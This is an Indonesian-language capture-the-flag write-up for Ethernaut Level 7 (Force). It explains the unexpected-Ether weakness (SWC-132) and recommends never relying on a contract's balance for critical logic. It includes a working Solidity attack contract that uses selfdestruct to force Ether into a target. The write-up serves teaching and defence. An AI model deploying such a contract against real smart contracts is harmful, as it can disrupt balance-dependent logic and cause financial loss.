## force — Level 7

### Alur Logika Contract
pada contract ini aku cukup bingung karena codenya hanya simbol simbil tidak jelas namun setelah ku baca ternyata kita bisa mengirim token pada contracrt yang walaupun tidak memiliki function ataupun payable/recieve dengan

### Vulnerability
Nama: SWC-132
Penjelasan:(Unexpected Ether / Force-Feeding)

### Impact

Pada Ethernaut Level 7 (Force), impact (dampak) atau pelajaran utama yang ingin disampaikan adalah bahwa Anda tidak boleh mengandalkan saldo suatu kontrak (melalui address(this).balance) sebagai logika kritis di dalam smart contract.

### Cara Eksploit
namun setelah ku baca ternyata kita bisa mengirim token pada contracrt yang walaupun tidak memiliki function ataupun payable/recieve dengan cara menggunakan contract lain dan menggunakna selfdestruct untuk mengirim saldo pada contracct yang akan di hancurkan ke contract target contoh contrct attact nya seperti ini:
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttack {
    
    constructor() payable {
        // payable agar bisa terima ETH saat deploy
    }

    function attack(address payable _target) public {
        selfdestruct(_target);
    }
}

### Rekomendasi Fix
jangan pernah bergantung pada saldo kontrak (address(this).balance) untuk mengontrol logika kritis atau alur eksekusi program.Sebab, fungsi selfdestruct (dan juga reward dari block mining) dapat memaksa masuknya Ether ke kontrak pintar mana pun tanpa bisa dicegah.